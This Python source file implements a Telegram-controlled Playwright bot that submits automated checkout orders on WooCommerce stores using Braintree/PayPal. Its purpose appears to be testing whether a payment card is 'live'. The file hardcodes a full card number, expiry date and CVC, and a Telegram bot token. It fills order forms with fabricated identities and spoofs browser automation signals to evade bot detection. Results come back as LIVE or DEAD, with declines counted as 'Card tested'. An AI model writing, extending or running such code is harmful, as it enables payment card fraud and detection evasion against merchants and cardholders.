#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Braintree Bot + Watcher — Single File
- /paypal <url> — Playwright checkout
- Sends every step + screenshot to owner
"""
import telebot
import time, os, re, json, random, threading, logging, sys, traceback
from datetime import datetime
from urllib.parse import urlparse

from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Error as PWError

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN   = '8407490230:AAEhaQd1CAsCH8qRaaFCQ65o9RVAf8EdTiA'
OWNER_ID    = 6843321125
ADMINS      = {str(OWNER_ID)}

SCREENSHOT_DIR = 'screens'
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

CARD_NUMBER = '5523427233579293'
CARD_MM     = '12'
CARD_YY     = '2027'
CARD_CVC    = '953'

HEADLESS     = True
TYPE_DELAY   = 80
PAGE_TIMEOUT = 60000
NAV_TIMEOUT  = 90000

USERS_FILE = 'users.txt'
BLOCK_FILE = 'block.txt'

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w').close()
    except: pass

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('bot.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('bt')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ═══════════════════════════════════════════════════════════════════════════════
#  WATCHER HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _watch_send(text, retries=3):
    for i in range(retries):
        try:
            return bot.send_message(OWNER_ID, text, parse_mode='HTML',
                                     disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if "can't parse" in err.lower():
                try:
                    return bot.send_message(OWNER_ID, re.sub(r'<[^>]+>','',text)[:4000])
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def log_step(name, detail=''):
    try:
        _watch_send(f'🟢 <b>STEP</b> <code>{name}</code>\n'
                    f'{detail[:300] if detail else ""}\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def log_info(msg):
    try:
        _watch_send(f'ℹ️ {msg}\n🕐 <code>{_ts()}</code>')
    except: pass

def log_response(label, resp, max_len=700):
    try:
        _watch_send(f'📡 <b>RESPONSE</b> <code>{label}</code>\n'
                    f'━━━━━━━━━━━━━━━━━━━━\n'
                    f'<code>{str(resp)[:max_len]}</code>\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def log_error(name, err, tb=None):
    try:
        msg = (f'🔴 <b>ERROR</b> <code>{name}</code>\n'
               f'━━━━━━━━━━━━━━━━━━━━\n'
               f'<code>{str(err)[:700]}</code>\n')
        if tb:
            msg += f'\n<pre>{tb[-1000:]}</pre>\n'
        msg += f'🕐 <code>{_ts()}</code>'
        _watch_send(msg)
    except: pass

def log_success(msg, detail=''):
    try:
        _watch_send(f'✅ <b>SUCCESS</b>\n━━━━━━━━━━━━━━━━━━━━\n{msg}\n'
                    f'{detail[:400] if detail else ""}\n'
                    f'🕐 <code>{_ts()}</code>')
    except: pass

def watch_screenshot(page, label='screenshot'):
    try:
        fname = f'watch_{int(time.time())}_{random.randint(100,999)}.png'
        fpath = os.path.join(SCREENSHOT_DIR, fname)
        page.screenshot(path=fpath, full_page=True, timeout=15000)
        with open(fpath, 'rb') as f:
            bot.send_photo(OWNER_ID, f,
                           caption=f'📸 <b>{label}</b>\n🕐 <code>{_ts()}</code>',
                           parse_mode='HTML', timeout=120)
        try: os.remove(fpath)
        except: pass
        return True
    except Exception as e:
        try:
            _watch_send(f'📸 Screenshot failed: <code>{str(e)[:150]}</code>')
        except: pass
        return False

# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN DATA
# ═══════════════════════════════════════════════════════════════════════════════
FIRST = ['James','John','Robert','Michael','William','David','Richard','Joseph',
         'Thomas','Charles','Daniel','Matthew','Anthony','Mark','Donald','Steven']

LAST = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis',
        'Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas']

STREETS = ['High','Church','Park','Victoria','Green','Manor','Kings','Queens',
           'Station','Mill','School','New','Mount','Forest','Garden','Spring']

ST_TYPES = ['Street','Road','Lane','Avenue','Close','Drive','Way','Place']

CITIES_UK = [
    ('London','EC1A 1BB'), ('Manchester','M1 1AE'), ('Birmingham','B1 1AA'),
    ('Leeds','LS1 1UR'), ('Liverpool','L1 0AA'), ('Bristol','BS1 1AA'),
]

def rnd_name():
    return random.choice(FIRST), random.choice(LAST)

def rnd_email(f, l):
    n = random.randint(1, 9999)
    return random.choice([
        f'{f.lower()}{n}@gmail.com',
        f'{f.lower()}.{l.lower()}{n}@gmail.com',
        f'{f.lower()}{l.lower()}{n}@outlook.com',
    ])

def rnd_address():
    n = random.randint(1, 250)
    s = random.choice(STREETS)
    t = random.choice(ST_TYPES)
    c, pc = random.choice(CITIES_UK)
    return f'{n} {s} {t}', c, pc

def rnd_phone():
    return '07' + ''.join(str(random.randint(0,9)) for _ in range(9))

# ═══════════════════════════════════════════════════════════════════════════════
#  URL VALIDATION
# ═══════════════════════════════════════════════════════════════════════════════
_URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip()
        if not link.startswith(('http://','https://')): link = 'https://' + link
        p = urlparse(link)
        if not p.netloc: return None
        host = p.netloc.split(':')[0]
        if not _URL_RE.match(host): return None
        return link
    except: return None

# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def pause(a=0.4, b=1.2):
    time.sleep(random.uniform(a, b))

def type_human(page, sel, text):
    try:
        page.fill(sel, '', timeout=5000)
        page.click(sel, timeout=5000)
        pause(0.2, 0.5)
        page.type(sel, text, delay=TYPE_DELAY, timeout=10000)
        pause(0.3, 0.7)
        return True
    except: return False

def mouse_play(page):
    try:
        vp = page.viewport_size or {'width':1366,'height':768}
        for _ in range(random.randint(2,4)):
            page.mouse.move(
                random.randint(100, vp['width']-100),
                random.randint(100, vp['height']-100),
                steps=random.randint(8,20),
            )
            pause(0.2, 0.6)
        page.mouse.wheel(0, random.randint(100, 300))
        pause(0.3, 0.8)
    except: pass

def scroll_page(page):
    try:
        for _ in range(random.randint(1,3)):
            page.mouse.wheel(0, random.randint(150, 400))
            pause(0.3, 0.7)
    except: pass

# ═══════════════════════════════════════════════════════════════════════════════
#  PLAYWRIGHT FLOW
# ═══════════════════════════════════════════════════════════════════════════════
def do_flow(page, url):
    res = {'status':'unknown', 'response':'', 'error':'', 'screenshot':None}

    f, l = rnd_name()
    email = rnd_email(f, l)
    addr, city, pc = rnd_address()
    phone = rnd_phone()

    log_step('1. Navigate', url)

    try:
        # ═══ Navigate ═══
        try:
            page.goto(url, wait_until='domcontentloaded', timeout=NAV_TIMEOUT)
        except PWTimeout:
            log_info('Nav timeout, continue')

        log_info(f'Title: {page.title()}')
        pause(2.0, 4.0)
        mouse_play(page)
        scroll_page(page)
        watch_screenshot(page, '1. After navigate')

        # ═══ Analyze ═══
        log_step('2. Analyze page')
        try:
            page_info = page.evaluate("""() => ({
                hasCheckout: !!document.querySelector('#place_order, form.checkout'),
                hasEmail: !!document.querySelector('#billing_email, input[name="billing_email"]'),
                hasCard: !!document.querySelector('#card_number, input[name*="card"]'),
                hasPayPal: !!document.querySelector('[class*="paypal"]'),
                hasTurnstile: !!document.querySelector('[class*="turnstile"], .cf-turnstile'),
                forms: document.querySelectorAll('form').length,
            })""")
            log_info(f'Page: {json.dumps(page_info)}')
        except Exception as e:
            log_error('2. Analyze', e)

        # ═══ Fill form ═══
        log_step('3. Fill form')
        log_info(f'Data: {f} {l} | {email}')

        for sel in ['#billing_first_name','input[name="billing_first_name"]']:
            if type_human(page, sel, f): break
        pause(0.3, 0.8)

        for sel in ['#billing_last_name','input[name="billing_last_name"]']:
            if type_human(page, sel, l): break
        pause(0.3, 0.8)

        for sel in ['#billing_country','select[name="billing_country"]']:
            try:
                page.select_option(sel, 'GB', timeout=3000)
                break
            except: pass
        pause(0.3, 0.8)

        for sel in ['#billing_address_1','input[name="billing_address_1"]']:
            if type_human(page, sel, addr): break
        pause(0.3, 0.8)

        for sel in ['#billing_city','input[name="billing_city"]']:
            if type_human(page, sel, city): break
        pause(0.3, 0.8)

        for sel in ['#billing_postcode','input[name="billing_postcode"]']:
            if type_human(page, sel, pc): break
        pause(0.3, 0.8)

        for sel in ['#billing_phone','input[name="billing_phone"]']:
            if type_human(page, sel, phone): break
        pause(0.3, 0.8)

        for sel in ['#billing_email','input[name="billing_email"]']:
            if type_human(page, sel, email): break
        pause(0.5, 1.2)

        watch_screenshot(page, '3. After form fill')

        # ═══ Card iframes ═══
        log_step('4. Fill card')
        log_info(f'Frames: {len(page.frames)}')

        card_filled = False
        for i, frame in enumerate(page.frames):
            try:
                furl = (frame.url or '').lower()
            except:
                continue
            if not furl: continue
            log_info(f'Frame {i}: {furl[:100]}')

            if 'braintree' in furl or 'hosted-fields' in furl or 'paypal' in furl:
                try:
                    for sel in ['input[name="number"]','input[name*="card-number"]','#credit-card-number']:
                        try:
                            frame.fill(sel, CARD_NUMBER, timeout=2000)
                            card_filled = True
                            log_info(f'Card filled in frame {i}')
                            break
                        except: continue

                    for sel in ['input[name="expirationDate"]','input[name*="expiration"]','input[name*="expiry"]']:
                        try:
                            frame.fill(sel, f'{CARD_MM}/{CARD_YY}', timeout=2000)
                            break
                        except: continue

                    for sel in ['input[name="cvv"]','input[name*="cvc"]','input[name*="security-code"]']:
                        try:
                            frame.fill(sel, CARD_CVC, timeout=2000)
                            break
                        except: continue
                except Exception as e:
                    log_error(f'frame {i}', e)

        if not card_filled:
            for sel, val in [
                ('#card_number', CARD_NUMBER),
                ('#card_expiry', f'{CARD_MM}/{CARD_YY}'),
                ('#card_cvc', CARD_CVC),
            ]:
                try: page.fill(sel, val, timeout=1500)
                except: pass

        pause(0.5, 1.0)
        mouse_play(page)

        # ═══ Terms ═══
        log_step('5. Accept terms')
        for sel in ['#terms','input[name="terms"]','input[name="gdpr_woo_consent"]']:
            try:
                if not page.is_checked(sel, timeout=1000):
                    page.check(sel, timeout=2000)
                break
            except: continue
        pause(0.5, 1.0)

        # ═══ Submit ═══
        log_step('6. Submit order')
        clicked = False
        for sel in ['#place_order','button[name="woocommerce_checkout_place_order"]',
                    'input[name="woocommerce_checkout_place_order"]','button[type="submit"]']:
            try:
                page.click(sel, timeout=4000)
                clicked = True
                log_info(f'Clicked: {sel}')
                break
            except: continue

        if not clicked:
            res['error'] = 'NO_SUBMIT_BUTTON'
            log_error('6. Submit', 'No button found')
            watch_screenshot(page, '6. No submit button')
            return res

        page.wait_for_timeout(12000)
        watch_screenshot(page, '6. After submit')

        # ═══ Read response ═══
        log_step('7. Read response')
        try:
            r = page.evaluate("""() => {
                const err = document.querySelector('.woocommerce-error, .wc-block-components-notice-banner.is-error');
                const suc = document.querySelector('.woocommerce-message, .wc-block-components-notice-banner.is-success');
                if (err) return 'ERROR: ' + err.textContent.trim().substring(0,400);
                if (suc) return 'SUCCESS: ' + suc.textContent.trim().substring(0,400);
                if (window.location.href.includes('order-received')) return 'ORDER_RECEIVED';
                return 'UNKNOWN';
            }""")
            res['response'] = r
            log_response('Final', r)

            low = r.lower()
            if 'order_received' in low or 'success' in low or 'thank you' in low:
                res['status'] = 'live'
                log_success('Order placed!', r)
            elif '3d secure' in low or '3ds' in low:
                res['status'] = 'live'
                res['response'] = '3DS_CHALLENGE: ' + r[:200]
                log_success('3DS Challenge', r)
            elif any(k in low for k in ['declined','rejected','insufficient','cvv','expired','verify','human']):
                res['status'] = 'live'
                log_success('Card tested', r)
            else:
                res['status'] = 'unknown'
                watch_screenshot(page, '7. Unknown response')
        except Exception as e:
            res['error'] = f'READ: {e}'
            log_error('7. Read', e)
            watch_screenshot(page, '7. Read error')

    except PWTimeout as e:
        res['error'] = f'TIMEOUT: {str(e)[:150]}'
        log_error('TIMEOUT', e, traceback.format_exc())
        watch_screenshot(page, 'Timeout')
    except PWError as e:
        res['error'] = f'PW_ERROR: {str(e)[:150]}'
        log_error('PW_ERROR', e, traceback.format_exc())
        watch_screenshot(page, 'PW error')
    except Exception as e:
        res['error'] = f'EXCEPTION: {str(e)[:150]}'
        log_error('EXCEPTION', e, traceback.format_exc())
        watch_screenshot(page, 'Exception')

    return res

def run_session(url):
    final = {'status':'unknown','response':'','error':'','screenshot':None}
    try:
        log_info('Launching browser...')
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=HEADLESS,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox','--disable-dev-shm-usage',
                    '--disable-setuid-sandbox','--disable-web-security',
                ]
            )
            ctx = browser.new_context(
                viewport={'width':1366,'height':768},
                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/120.0.0.0 Safari/537.36'),
                locale='en-GB',
                timezone_id='Europe/London',
                ignore_https_errors=True,
            )
            ctx.add_init_script("""
                Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
                Object.defineProperty(navigator,'languages',{get:()=>['en-GB','en']});
                window.chrome={runtime:{}};
            """)
            page = ctx.new_page()
            page.set_default_timeout(PAGE_TIMEOUT)
            page.set_default_navigation_timeout(NAV_TIMEOUT)

            result = do_flow(page, url)
            final.update(result)

            try: ctx.close()
            except: pass
            try: browser.close()
            except: pass
    except Exception as e:
        final['error'] = f'LAUNCH: {str(e)[:150]}'
        log_error('LAUNCH', e, traceback.format_exc())
    return final

# ═══════════════════════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def handle_start(msg):
    try:
        uids = open(USERS_FILE).read().splitlines()
        if str(msg.from_user.id) not in uids:
            open(USERS_FILE, 'a').write(f'{msg.from_user.id}\n')
        bot.reply_to(msg,
            f'✅ Bot ready\n'
            f'User: {msg.from_user.first_name}\n'
            f'ID: {msg.from_user.id}\n\n'
            f'Commands:\n'
            f'/paypal <url> — test checkout\n'
            f'/ping — health check\n'
            f'/stats — statistics')
    except Exception as e:
        log_error('start handler', e)
        try:
            bot.reply_to(msg, f'Error: {e}')
        except:
            pass


@bot.message_handler(commands=['ping'])
def handle_ping(msg):
    try:
        t0 = time.time()
        bot.reply_to(msg, 'Pong...')
        dt = (time.time() - t0) * 1000
        bot.send_message(msg.chat.id,
            f'🏓 Pong!\n'
            f'Latency: {dt:.0f}ms\n'
            f'Card: ****{CARD_NUMBER[-4:]}\n'
            f'Headless: {HEADLESS}\n'
            f'Owner: {OWNER_ID}')
    except Exception as e:
        log_error('ping handler', e)
        try:
            bot.reply_to(msg, f'Error: {e}')
        except:
            pass


@bot.message_handler(commands=['stats'])
def handle_stats(msg):
    try:
        users_n = len(open(USERS_FILE).read().splitlines())
        bot.reply_to(msg,
            f'📊 Stats\n'
            f'Users: {users_n}\n'
            f'Card: ****{CARD_NUMBER[-4:]}\n'
            f'Headless: {HEADLESS}')
    except Exception as e:
        try:
            bot.reply_to(msg, f'Error: {e}')
        except:
            pass


@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def handle_paypal(msg):
    try:
        parts = msg.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(msg, 'Usage: /paypal <url>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            bot.reply_to(msg, 'Invalid URL')
            return

        # Notify owner — request received
        try:
            _watch_send(
                f'🎯 <b>NEW CHECK</b>\n'
                f'━━━━━━━━━━━━━━━━━━━━\n'
                f'👤 From: {msg.from_user.first_name}\n'
                f'🆔 ID: <code>{msg.from_user.id}</code>\n'
                f'🔗 <code>{link[:200]}</code>\n'
                f'🕐 <code>{_ts()}</code>'
            )
        except: pass

        status = bot.reply_to(msg, f'⏳ Testing: {link[:80]}\nWait...')

        def worker():
            try:
                result = run_session(link)
                status_val = result.get('status','unknown')
                resp = (result.get('response') or '')[:300]
                err = (result.get('error') or '')[:300]

                if status_val == 'live':
                    final = (
                        f'✅ LIVE\n'
                        f'URL: {link[:80]}\n'
                        f'Response: {resp[:200]}'
                    )
                    log_success('Final: LIVE', resp)
                else:
                    reason = err or resp or 'UNKNOWN'
                    final = (
                        f'❌ DEAD\n'
                        f'URL: {link[:80]}\n'
                        f'Response: {reason[:200]}'
                    )
                    log_error('Final: DEAD', reason)

                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=status.message_id,
                        text=final,
                        disable_web_page_preview=True,
                    )
                except: pass

            except Exception as e:
                log_error('Worker', e, traceback.format_exc())
                try:
                    bot.edit_message_text(
                        chat_id=msg.chat.id,
                        message_id=status.message_id,
                        text=f'Error: {str(e)[:200]}'
                    )
                except: pass

        threading.Thread(target=worker, daemon=True).start()

    except Exception as e:
        log_error('paypal handler', e)
        try:
            bot.reply_to(msg, f'Error: {e}')
        except:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    log.info('Bot starting...')
    log.info(f'Card: ****{CARD_NUMBER[-4:]}')
    log.info(f'Owner: {OWNER_ID}')
    log.info(f'Headless: {HEADLESS}')

    try:
        _watch_send(
            f'🚀 <b>BOT ONLINE</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━\n'
            f'💳 Card: <code>****{CARD_NUMBER[-4:]}</code>\n'
            f'👤 Owner: <code>{OWNER_ID}</code>\n'
            f'🖥️ Headless: <code>{HEADLESS}</code>\n'
            f'🕐 <code>{_ts()}</code>'
        )
    except: pass

    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 skip_pending=True, logger_level=logging.WARNING)
        except KeyboardInterrupt:
            log.info('Bot stopped')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'polling: {str(e)[:200]}')
            log_error('POLLING', e, traceback.format_exc())
            if '409' in err or 'conflict' in err:
                time.sleep(60)
            else:
                time.sleep(15)
